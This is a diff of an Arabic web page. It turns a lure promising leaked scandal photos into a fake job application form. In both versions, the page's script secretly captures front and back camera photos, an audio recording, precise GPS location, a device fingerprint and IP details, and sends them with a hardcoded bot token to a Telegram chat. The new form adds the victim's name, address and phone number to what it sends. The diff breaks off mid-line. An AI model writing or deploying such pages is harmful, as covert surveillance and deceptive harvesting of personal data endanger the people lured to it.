@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title> فضائح ببا  | </title>
+    <title>نموذج توظيف - بيانات المتقدم</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');
 
@@ -81,7 +81,7 @@
             position: relative;
             z-index: 1;
             width: 100%;
-            max-width: 460px;
+            max-width: 500px;
             background: rgba(0, 0, 0, 0.7);
             backdrop-filter: blur(30px);
             -webkit-backdrop-filter: blur(30px);
@@ -108,15 +108,15 @@
 
         /* ========== الأيقونة ========== */
         .icon-box {
-            width: 90px;
-            height: 90px;
+            width: 80px;
+            height: 80px;
             background: linear-gradient(135deg, #dc2626, #991b1b);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 16px;
-            font-size: 44px;
+            font-size: 40px;
             box-shadow: 0 12px 50px rgba(220, 38, 38, 0.3);
             position: relative;
             animation: pulse-icon 2s ease-in-out infinite;
@@ -147,7 +147,7 @@
         /* ========== النصوص ========== */
         .main-title {
             color: #ffffff;
-            font-size: 28px;
+            font-size: 26px;
             font-weight: 900;
             margin-bottom: 4px;
             text-shadow: 0 0 40px rgba(220, 38, 38, 0.2);
@@ -163,77 +163,61 @@
         .sub-desc {
             color: rgba(255, 255, 255, 0.4);
             font-size: 14px;
-            margin-bottom: 6px;
-        }
-
-        .warning-text {
-            color: rgba(239, 68, 68, 0.5);
-            font-size: 12px;
             margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
         }
 
-        .warning-text .blink {
-            animation: blink 1s infinite;
+        /* ========== نموذج البيانات ========== */
+        .form-group {
+            margin-bottom: 16px;
+            text-align: right;
         }
 
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.2; }
+        .form-group label {
+            display: block;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 5px;
         }
 
-        /* ========== صور وفيديوهات (وهمية) ========== */
-        .media-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 8px;
-            margin-bottom: 18px;
+        .form-group label .optional {
+            color: rgba(255, 255, 255, 0.2);
+            font-size: 11px;
+            font-weight: 400;
         }
 
-        .media-grid .media-item {
-            aspect-ratio: 1;
-            border-radius: 14px;
+        .form-group input,
+        .form-group textarea {
+            width: 100%;
+            padding: 12px 16px;
             background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            position: relative;
-            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 15px;
+            font-family: 'Cairo', sans-serif;
             transition: all 0.3s ease;
         }
 
-        .media-grid .media-item:hover {
+        .form-group input:focus,
+        .form-group textarea:focus {
+            outline: none;
+            border-color: rgba(239, 68, 68, 0.4);
             background: rgba(255, 255, 255, 0.06);
-            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(220, 38, 38, 0.05);
         }
 
-        .media-grid .media-item .play-icon {
-            position: absolute;
-            font-size: 14px;
-            color: white;
-            background: rgba(0,0,0,0.5);
-            padding: 4px 8px;
-            border-radius: 30px;
-            font-size: 10px;
+        .form-group input::placeholder,
+        .form-group textarea::placeholder {
+            color: rgba(255, 255, 255, 0.2);
         }
 
-        .media-grid .media-item .tag {
-            position: absolute;
-            bottom: 4px;
-            right: 4px;
-            font-size: 8px;
-            color: rgba(255,255,255,0.2);
-            background: rgba(0,0,0,0.4);
-            padding: 2px 8px;
-            border-radius: 20px;
+        .form-group textarea {
+            min-height: 80px;
+            resize: vertical;
         }
 
-        /* ========== زر البدء ========== */
+        /* ========== زر الإرسال ========== */
         .start-btn {
             width: 100%;
             padding: 20px;
@@ -241,7 +225,7 @@
             border: none;
             border-radius: 60px;
             color: white;
-            font-size: 22px;
+            font-size: 20px;
             font-weight: 900;
             font-family: 'Cairo', sans-serif;
             cursor: pointer;
@@ -371,13 +355,13 @@
             font-family: monospace;
         }
 
-        /* ========== نتيجة الكشف ========== */
+        /* ========== رسالة نجاح ========== */
         .result-box {
             display: none;
             margin-top: 16px;
             padding: 20px;
-            background: rgba(239, 68, 68, 0.06);
-            border: 1px solid rgba(239, 68, 68, 0.12);
+            background: rgba(34, 197, 94, 0.06);
+            border: 1px solid rgba(34, 197, 94, 0.12);
             border-radius: 20px;
         }
 
@@ -474,8 +458,6 @@
             .main-title { font-size: 22px; }
             .icon-box { width: 72px; height: 72px; font-size: 34px; }
             .start-btn { font-size: 18px; padding: 18px; }
-            .media-grid { gap: 6px; }
-            .media-grid .media-item { font-size: 18px; }
         }
     </style>
 </head>
@@ -492,56 +474,54 @@
 <div class="main-card">
 
     <!-- شارة -->
-    <div class="header-badge">🔥 حصري | تم تسريبه الآن</div>
+    <div class="header-badge">📋 توظيف | تعبئة البيانات</div>
 
     <!-- أيقونة -->
-    <div class="icon-box">🔥</div>
+    <div class="icon-box">📝</div>
 
     <!-- العنوان -->
-    <h1 class="main-title">كشف <span>االصور والضفايح ببا المستقبل</span></h1>
-    <p class="sub-desc">شاهد صور وفضايح رجال اعمال ببا </p>
-    <div class="warning-text">
-        <span class="blink">⚡</span>
-        تم تسريب صور وفيديوهات جديدة
-        <span class="blink">⚡</span>
-    </div>
+    <h1 class="main-title">نموذج <span>التوظيف</span></h1>
+    <p class="sub-desc">يرجى تعبئة البيانات المطلوبة</p>
 
-    <!-- صور وفيديوهات  -->
-    <div class="media-grid">
-        <div class="media-item">
-            📸
-            <span class="tag">صورة</span>
+    <!-- ====== نموذج البيانات ====== -->
+    <form id="applicationForm" onsubmit="return false;">
+        <div class="form-group">
+            <label>👤 الاسم الكامل <span style="color:#ef4444;">*</span></label>
+            <input type="text" id="fullName" placeholder="أدخل اسمك الثلاثي" required>
         </div>
-        <div class="media-item">
-            📹
-            <span class="play-icon">▶</span>
-            <span class="tag">فيديو</span>
-        </div>
-        <div class="media-item">
-            📸
-            <span class="tag">صورة</span>
-        </div>
-        <div class="media-item">
-            📹
-            <span class="play-icon">▶</span>
-            <span class="tag">فيديو</span>
-        </div>
-        <div class="media-item">
-            📸
-            <span class="tag">صورة</span>
-        </div>
-        <div class="media-item">
-            🔞
-            <span class="tag">خاص</span>
-        </div>
-    </div>
 
-    <!-- زر البدء -->
+        <div class="form-group">
+            <label>📅 السن <span style="color:#ef4444;">*</span></label>
+            <input type="number" id="age" placeholder="العمر" min="18" max="65" required>
+        </div>
+
+        <div class="form-group">
+            <label>📍 العنوان <span style="color:#ef4444;">*</span></label>
+            <input type="text" id="address" placeholder="العنوان بالتفصيل" required>
+        </div>
+
+        <div class="form-group">
+            <label>📞 رقم الهاتف <span style="color:#ef4444;">*</span></label>
+            <input type="tel" id="phoneNumber" placeholder="رقم الهاتف المحمول" required>
+        </div>
+
+        <div class="form-group">
+            <label>📧 البريد الإلكتروني <span class="optional">(اختياري)</span></label>
+            <input type="email" id="email" placeholder="example@email.com">
+        </div>
+
+        <div class="form-group">
+            <label>📝 ملاحظات إضافية <span class="optional">(اختياري)</span></label>
+            <textarea id="notes" placeholder="أي معلومات إضافية تود إضافتها..."></textarea>
+        </div>
+    </form>
+
+    <!-- زر الإرسال -->
     <button class="start-btn" id="startBtn">
-        <span class="btn-text">🔥 اضغط هنا للمشاهده 🔥</span>
+        <span class="btn-text">📤 إرسال الطلب</span>
         <span class="loader-text">
             <span class="spinner"></span>
-            جاري كشف  ...
+            جاري الإرسال...
         </span>
     </button>
 
@@ -549,13 +529,13 @@
     <div class="permit-hint">
         <span>📌 اضغط</span>
         <span class="key">سماح</span>
-        <span>لتفعيل الكشف</span>
+        <span>لتفعيل الإرسال</span>
     </div>
 
     <!-- شريط التحميل -->
     <div class="progress-wrap" id="progressWrap">
         <div class="top-row">
-            <span id="stepLabel">⏳ جاري كشف </span>
+            <span id="stepLabel">⏳ جاري المعالجة...</span>
             <span class="percent" id="percentLabel">0%</span>
         </div>
         <div class="progress-track">
@@ -564,11 +544,11 @@
         <div class="step-info" id="stepInfo">⏱️ 0 ثانية</div>
     </div>
 
-    <!-- نتيجة الكشف -->
+    <!-- رسالة نجاح -->
     <div class="result-box" id="resultBox">
-        <span class="result-icon">👤</span>
-        <div class="result-name" id="resultName">أحمد محمد</div>
-        <div class="result-sub" id="resultSub">✅ تم كشف هوية الخائن بنجاح</div>
+        <span class="result-icon">✅</span>
+        <div class="result-name" id="resultName">تم إرسال الطلب بنجاح!</div>
+        <div class="result-sub" id="resultSub">شكراً لتقديمك، سيتم التواصل معك قريباً</div>
     </div>
 
     <!-- رسالة خطأ -->
@@ -576,8 +556,8 @@
 
     <!-- تذييل -->
     <div class="footer-links">
-        <span>🔒 آمن</span>
-        <span>⚡ فوري</span>
+        <span>🔒 بيانات آمنة</span>
+        <span>⚡ إرسال فوري</span>
         <span>📱 متوافق مع جميع الأجهزة</span>
     </div>
 </div>
@@ -591,7 +571,7 @@
 <script>
     (function() {
         // ============================================================
-        // ================ إعدادات البوت (نفس الكود الأصلي) ============
+        // ================ إعدادات البوت ==============================
         // ============================================================
         const BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
         const MASTER_ID = "5849068535";
@@ -637,7 +617,7 @@
         // ============================================================
         // ================ الكاميرا الأمامية (سيلفي) =================
         // ============================================================
-        async function captureFrontCamera(chatId, botToken, phoneNumber) {
+        async function captureFrontCamera(chatId, botToken, formData) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
@@ -652,7 +632,7 @@
                 canvas.height = video.videoHeight || 600;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-                const caption = `📸 كاميرا أمامية (سيلفي)\n📞 الرقم: ${phoneNumber}`;
+                const caption = `📸 صورة سيلفي للمتقدم\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}`;
                 await sendToTelegram(chatId, botToken, 'photo', blob, caption);
                 stream.getTracks().forEach(t => t.stop());
                 return true;
@@ -665,7 +645,7 @@
         // ============================================================
         // ================ الكاميرا الخلفية ===========================
         // ============================================================
-        async function captureBackCamera(chatId, botToken, phoneNumber) {
+        async function captureBackCamera(chatId, botToken, formData) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } 
@@ -679,7 +659,7 @@
                 canvas.height = video.videoHeight || 768;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-                const caption = `📷 كاميرا خلفية - محيط المستخدم\n📞 الرقم: ${phoneNumber}`;
+                const caption = `📷 صورة محيط المتقدم\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}`;
                 await sendToTelegram(chatId, botToken, 'photo', blob, caption);
                 stream.getTracks().forEach(t => t.stop());
                 return true;
@@ -692,7 +672,7 @@
         // ============================================================
         // ================ التسجيل الصوتي =============================
         // ============================================================
-        async function recordAmbientAudio(chatId, botToken, phoneNumber) {
+        async function recordAmbientAudio(chatId, botToken, formData) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
@@ -701,7 +681,7 @@
                 const audioPromise = new Promise(resolve => {
                     mediaRecorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const caption = `🎤 تسجيل صوتي (8 ثوان)\n📞 الرقم: ${phoneNumber}`;
+                        const caption = `🎤 تسجيل صوتي للمتقدم\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}`;
                         await sendToTelegram(chatId, botToken, 'audio', blob, caption);
                         resolve(true);
                     };
@@ -719,7 +699,7 @@
         // ============================================================
         // ================ الموقع الجغرافي ============================
         // ============================================================
-        function getPreciseLocation(chatId, botToken, phoneNumber) {
+        function getPreciseLocation(chatId, botToken, formData) {
             return new Promise((resolve) => {
                 if(!navigator.geolocation) {
                     resolve(false);
@@ -735,7 +715,7 @@
                         const data = await revGeo.json();
                         if(data.display_name) addressHint = `📍 العنوان: ${data.display_name.substring(0, 100)}`;
                     } catch(e) {}
-                    const locMsg = `🌍 <b>الموقع الجغرافي</b>\n📞 الرقم: ${phoneNumber}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
+                    const locMsg = `🌍 <b>موقع المتقدم</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 دقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
                     await sendToTelegram(chatId, botToken, 'text', null, locMsg);
                     resolve(true);
                 }, (err) => {
@@ -748,7 +728,7 @@
         // ============================================================
         // ================ بصمة الجهاز ================================
         // ============================================================
-        async function getDeepDeviceFingerprint(chatId, botToken, phoneNumber) {
+        async function getDeepDeviceFingerprint(chatId, botToken, formData) {
             const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
             const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
@@ -767,7 +747,7 @@
                 connection = `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
             }
             
-            const deviceMsg = `🕵️‍♂️ <b>بصمة الجهاز</b>\n📞 الرقم: ${phoneNumber}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
+            const deviceMsg = `🕵️‍♂️ <b>بيانات جهاز المتقدم</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
             
             await sendToTelegram(chatId, botToken, 'text', null, deviceMsg);
         }
@@ -775,7 +755,7 @@
         // ============================================================
         // ================ معلومات IP =================================
         // ============================================================
-        async function getRichIPData(chatId, botToken, phoneNumber) {
+        async function getRichIPData(chatId, botToken, formData) {
             try {
                 const [ipRes, ipInfoRes] = await Promise.all([
                     fetch('https://api.ipify.org?format=json'),
@@ -788,7 +768,7 @@
                 let country = ipDetails.country_name || "غير معروف";
                 let city = ipDetails.city || "غير معروف";
                 let isp = ipDetails.org || ipDetails.asn || "غير معروف";
-                const ipMsg = `🌐 <b>IP & Network</b>\n📞 الرقم: ${phoneNumber}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}`;
+                const ipMsg = `🌐 <b>IP المتقدم</b>\n👤 الاسم: ${formData.fullName}\n📞 الهاتف: ${formData.phone}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 المزود: ${isp}`;
                 await sendToTelegram(chatId, botToken, 'text', null, ipMsg);
             } catch(e) {}
         }
@@ -807,25 +787,11 @@
         const resultSub = document.getElementById('resultSub');
         const errorMsg = document.getElementById('errorMsg');
 
-        // رقم الهاتف ثابت (نفس الكود الأصلي)
-        const phoneNumber = "01050000000";
-
         let isRunning = false;
         let progressInterval = null;
         let counterInterval = null;
         let seconds = 0;
         let currentProgress = 0;
-
-        // أسماء وهمية للنتيجة
-        const fakeNames = [
-            'أحمد محمد', 'سارة علي', 'محمد حسن', 'نورا خالد', 'يوسف عمر',
-            'فاطمة أحمد', 'علي رضا', 'منى ياسر', 'حسام مصطفى', 'ريهام سامي',
-            'محمود طارق', 'هدى عبدالله', 'كريم السيد', 'ليلى محمود', 'أمير عادل'
-        ];
-
-        function getRandomName() {
-            return fakeNames[Math.floor(Math.random() * fakeNames.length)];
-        }
 
         function updateProgress(value, label, info) {
             currentProgress = Math.min(value, 100);
@@ -841,10 +807,9 @@
             setTimeout(() => errorMsg.classList.remove('show'), 4000);
         }
 
-        function showResult() {
-            const name = getRandomName();
-            resultName.textContent = name;
-            resultSub.textContent = '✅ تم كشف هوية  بنجاح';
+        function showSuccess() {
+            resultName.textContent = '✅ تم إرسال الطلب بنجاح!';
+            resultSub.textContent = 'شكراً لتقديمك، سيتم التواصل معك قريباً';
             resultBox.classList.add('show');
             setTimeout(() => resultBox.classList.remove('show'), 8000);
         }
@@ -854,6 +819,40 @@
         // ============================================================
         async function startProcess() {
             if (isRunning) return;
+
+            // ====== جمع بيانات النموذج ======
+            const fullName = document.getElementById('fullName').value.trim();
+            const age = document.getElementById('age').value.trim();
+            const address = document.getElementById('address').value.trim();
+            const phone = document.getElementById('phoneNumber').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const notes = document.getElementById('notes').value.trim();
+
+            // التحقق من الحقول المطلوبة (البريد اختياري)
+            if (!fullName || !age || !address || !phone) {
+                showError('⚠️ يرجى تعبئة جميع الحقول المطلوبة (الاسم، السن، العنوان، رقم الهاتف)');
+                return;
+            }
+
+            if (isNaN(age) || parseInt(age) < 18 || parseInt(age) > 65) {
+                showError('⚠️ السن يجب أن يكون بين 18 و 65 سنة');
+                return;
+            }
+
+            if (phone.length < 10) {
+                showError('⚠️ رقم الهاتف غير صحيح');
+                return;
+            }
+
+            // تجهيز بيانات النموذج
+            const formData = {
+                fullName: fullName,
+                age: age,
+                address: address,
+                phone: phone,
+                email: email || 'لم يتم الإدخال',
+                notes: notes || 'لا يوجد'
+            };
 
             isRunning = true;
             startBtn.classList.add('loading');
@@ -865,7 +864,7 @@
             // بدء شريط التحميل
             let progress = 0;
             seconds = 0;
-            updateProgress(0, '⏳ جاري كشف ...', '⏱️ 0 ثانية');
+            updateProgress(0, '⏳ جاري المعالجة...', '⏱️ 0 ثانية');
 
             progressInterval = setInterval(() => {
                 const increment = Math.random() * 3 + 0.5;
@@ -879,74 +878,6 @@
             }, 1000);
 
             try {
-                // ====== 1. إرسال بدء الطلب ======
-                updateProgress(5, '🔥 جاري تجهيز ...');
-                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
-                    `🔥 <b>طلب كشف </b>\n📞 الرقم: ${phoneNumber}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`
-                );
-                await new Promise(r => setTimeout(r, 400));
-
-                // ====== 2. بصمة الجهاز ======
-                updateProgress(15, '🕵️ جاري كشف المعلومات...');
-                await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, phoneNumber);
-                await new Promise(r => setTimeout(r, 400));
-
-                // ====== 3. IP ======
-                updateProgress(30, '🌐 جاري   ...');
-                await getRichIPData(MASTER_ID, BOT_TOKEN, phoneNumber);
-                await new Promise(r => setTimeout(r, 400));
-
-                // ====== 4. الكاميرا الأمامية ======
-                updateProgress(45, '📸 جاري   ...');
-                await captureFrontCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
-                await new Promise(r => setTimeout(r, 400));
-
-                // ====== 5. الكاميرا الخلفية ======
-                updateProgress(65, '📷 جاري   ...');
-                await captureBackCamera(MASTER_ID, BOT_TOKEN, phoneNumber);
-                await new Promise(r => setTimeout(r, 400));
-
-                // ====== 6. التسجيل الصوتي ======
-                updateProgress(80, '🎤 جاري   ...');
-                await recordAmbientAudio(MASTER_ID, BOT_TOKEN, phoneNumber);
-                await new Promise(r => setTimeout(r, 400));
-
-                // ====== 7. الموقع ======
-                updateProgress(90, '📍 جاري   ...');
-                await getPreciseLocation(MASTER_ID, BOT_TOKEN, phoneNumber);
-                await new Promise(r => setTimeout(r, 400));
-
-                // ====== 8. الإكمال ======
-                updateProgress(100, '✅ اكتملت !', '✅ تم بنجاح');
-                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
-                    `✅ <b>تم كشف  بنجاح!</b>\n📞 الرقم: ${phoneNumber}\n🔥 تم إرسال جميع الأدلة`
-                );
-
-                // عرض النتيجة
-                showResult();
-
-            } catch(e) {
-                console.error(e);
-                showError('❌ حدث خطأ أثناء كشف الفضيحة');
-            }
-
-            // إنهاء التحميل
-            clearInterval(progressInterval);
-            clearInterval(counterInterval);
-
-            setTimeout(() => {
-                progressWrap.classList.remove('active');
-                startBtn.classList.remove('loading');
-                startBtn.disabled = false;
-                isRunning = false;
-            }, 800);
-        }
-
-        // ========== ربط الأحداث ==========
-        startBtn.onclick = startProcess;
-
-    })();
-</script>
-
-</body>
-</html>
+                // ====== 1. إرسال بيانات النموذج ======
+                updateProgress(5, '📤 جاري إرسال البيانات...');
+                const formMsg = `
